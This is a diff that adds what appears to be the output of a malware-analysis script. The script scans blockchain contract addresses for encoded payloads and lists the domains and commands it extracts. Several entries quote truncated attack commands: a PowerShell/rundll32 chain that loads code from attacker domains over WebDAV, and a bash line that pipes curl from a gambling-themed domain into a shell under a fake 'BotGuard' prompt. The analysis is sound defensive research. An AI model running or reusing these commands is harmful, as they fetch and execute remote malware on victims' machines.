@@ -1,0 +1,34 @@
+0xA1decFB75C8C0CA28C10517ce56B710baf727d2e
+  max_atob_nesting_depth_unwrapped=0
+  domains_found=[]
+
+0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff
+  max_atob_nesting_depth_unwrapped=1
+  domains_found=['site-shartbandi-farsi.com']
+  command_found: pcalua.exe -a "powershell.exe" -c "saps cmd '/v/c set a=pu&set b=shd&set c=run&set d=dll32&for %x in (!a!!b!) do @%x \\{random8}.site-shartbandi-farsi.com@SSL\$...
+
+0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5
+  max_atob_nesting_depth_unwrapped=1
+  domains_found=['bahigo90bet.com']
+  command_found: /bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL '${usr_id}.bahigo90bet.com/?ublib=${uuid__}')"; echo ""BotGuard: Answer the protector challenge. Ref: 73282
+
+0x7Fd85c090f2b35071C57a3b9FeAF462aaEb0E437
+  max_atob_nesting_depth_unwrapped=0
+  domains_found=[]
+  command_found: curl|wget|python|java/i.test(t)||-1!==a.indexOf("/wp-json")||-1!==a.indexOf("wp-sitemap")||-1!==a.indexOf("robots")||-1!==a.indexOf(".xml")||/wp-login\.php|wp-c...
+
+0xfb448d465841c63f3bc433be61eb692b813d469d
+  max_atob_nesting_depth_unwrapped=0
+  domains_found=[]
+  command_found: curl|wget|python|java/i.test(t)||-1!==a.indexOf("/wp-json")||-1!==a.indexOf("wp-sitemap")||-1!==a.indexOf("robots")||-1!==a.indexOf(".xml")||/wp-login\.php|wp-c...
+
+0xdf132e2893824e26ec8ae8014b4f4facd54ed67f
+  max_atob_nesting_depth_unwrapped=0
+  domains_found=[]
+
+0x0cd58060328e308a43d3c53cfd03a45233ea308a
+  max_atob_nesting_depth_unwrapped=1
+  domains_found=['casinomhub.bet']
+  command_found: pcalua.exe -a "powershell.exe" -c "saps cmd '/v/c set a=pu&set b=shd&set c=run&set d=dll32&for %x in (!a!!b!) do @%x \\{random4}.casinomhub.bet@SSL\${uuid__} & ...
+
+Full results saved to 05_recursive_domain_extraction_all_contracts_RESULTS.json
